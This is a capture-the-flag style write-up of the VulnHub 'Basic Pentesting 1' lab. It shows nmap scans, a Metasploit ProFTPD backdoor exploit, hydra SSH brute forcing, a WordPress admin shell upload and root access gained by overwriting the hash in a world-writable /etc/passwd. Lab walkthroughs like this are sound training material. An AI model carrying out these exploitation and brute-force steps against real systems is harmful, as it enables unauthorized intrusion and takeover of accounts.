<h1 align="center">
  <a href="https://www.vulnhub.com/entry/basic-pentesting-1,216/">Basic_Pentesting1</a>
</h1>

## Port Scanning
```bash
$ nmap -A <target_ip>

Other Scanning Examples:
$ nmap -A -p- -T4 <target_ip>
$ nmap -sV -sC <target_ip>
```

## Open Ports
![](https://github.com/ninchy0/vulnhub-writeups/blob/main/Basic_pentesting1/images/OpenPorts.png)


## Exploiting port 21 ProFTPD 1.3.3c 
```bash
$ msfconsole
$ search ProFTPD
$ use exploit/unix/ftp/proftpd_133c_backdoor
$ set rhosts <target_ip>
$ set rport 21
$ run/exploit
--------------Hoorah--We--are--in--------------------
-------------------EXPLOITED-------------------------
```

## User enumeration
We had found that the users are marlinspike and root from previous ftp exploit.

## Bruteforcing into port 22 (SSH) using hydra trying default credentials
```bash
$ hydra -l marlinspike -P <wordlist> ssh://target_ip -V

Password Found for user(marlinspike):
[22][ssh] host: 192.168.1.70   login: marlinspike   password: marlinspike
```

## Privilege Escalation
> find / -type f -perm -u=s 2>/dev/null

![](https://github.com/ninchy0/vulnhub-writeups/blob/main/Basic_pentesting1/images/PrivEsc1.png)


After researching, we find that the user(marlinspike) can use all the commands.

![](https://github.com/ninchy0/vulnhub-writeups/blob/main/Basic_pentesting1/images/PrivEsc0.png)

Now, let's try abusing binary `sudo su` and enter password of the user `marlinspike` and boy we are in :V

![](https://github.com/ninchy0/vulnhub-writeups/blob/main/Basic_pentesting1/images/PrivEsc-Success.png)


## Directory Enumeration for port 80 (http-server)

> gobuster dir -u <target_url> -w <path-to-wordlist> 


![](https://github.com/ninchy0/vulnhub-writeups/blob/main/Basic_pentesting1/images/Directory-Enum.png)

We found /secret directory. Let's check in the browser.
We can see a wordpress blog running on the the server.


We can see that the webpage is not properly loading. 
So let's add the vtcsec into our /etc/hosts file and check how the webpage looks afterward.

![](https://github.com/ninchy0/vulnhub-writups/blob/main/Basic_pentesting1/images/Hosts.png)

![](https://github.com/ninchy0/vulnhub-writups/blob/main/Basic_pentesting1/images/Wordpress.png)



Now, let's go to wp-admin as it is the admin panel for wordpress sites and
try default login credentials i.e admin/admn we're in.
If the default credentials wouldn't have worked we probably would have needed to
bruteforce into the admin panel via burpsuite intruder or hydra or by using
any bruteforcing tools you prefer.

Now, let's try to gain access with wordpress exploit via metasploit.
```bash
$ msfconsole
$ search wp_admin
$ use exploit/unix/webapp/wp_admin_shell_upload

set every options that is needed for the exploit.
```

We can see that we got ourselves a meterpreter session.
![](https://github.com/ninchy0/vulnhub-writups/blob/main/Basic_pentesting1/images/reverse_shell.png)

## Privilege Escalation
To check for any potential misconfigurations that could lead to privilege escalation, a good script to use is the unix-privesc-check script from [pentestmonkey](https://github.compentestmonkey/unix-privesc-check)


This can be uploaded from the meterpreter session by running the following command:
> upload /usr/bin/unix-privesc-check /tmp/unix-privesc-check


After we upload the file to the server we then can execute the file:
```bash
$ shell
$ cd /tmp
$ chmod +x unix-privesc-check
```


The author of unix-privesc-check recommends to grep the output for WARNING, which will show any potential misconfigurations. This can be run as one single command:
> ./unix-privesc-check standard | grep WARNING


We can see `WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd` after executing the unix-privesc-check.

This means that we can write into the /etc/passwd file. So, let's download the file into our host machine by getting back into our meterpreter shell and executing:
> download /etc/passwd <path-where-to-save>


Now, from a local terminal, we can use openssl to generate a new hashed password:
> openssl passwd -1 lol

We get our hashed password i.e `$1$X5FkPmLQ$h0yILWHDiUeWUeezpmWU20`
	Now, open the passwd file we downloaded before and replace x after root like:
![](https://github.com/ninchy0/vulnhub-writups/blob/main/Basic_pentesting1/images/Hashed.png)

Now, all we need to do is upload the modified passwd file from our host to target server
	using:
> upload <path-where-you-saved> /etc/passwd

To make the shell interactive:
> python -c 'import pty; pty.spawn("/bin/bash")'

Finally, we can switch to root's account. 
```bash
$ su root
Password: lol
```
![](https://github.com/ninchy0/vulnhub-writups/blob/main/Basic_pentesting1/images/final-root-access.png)


<p style="text-align: right;"><a href="https://github.com/ninchy0">ninchy0</a></p>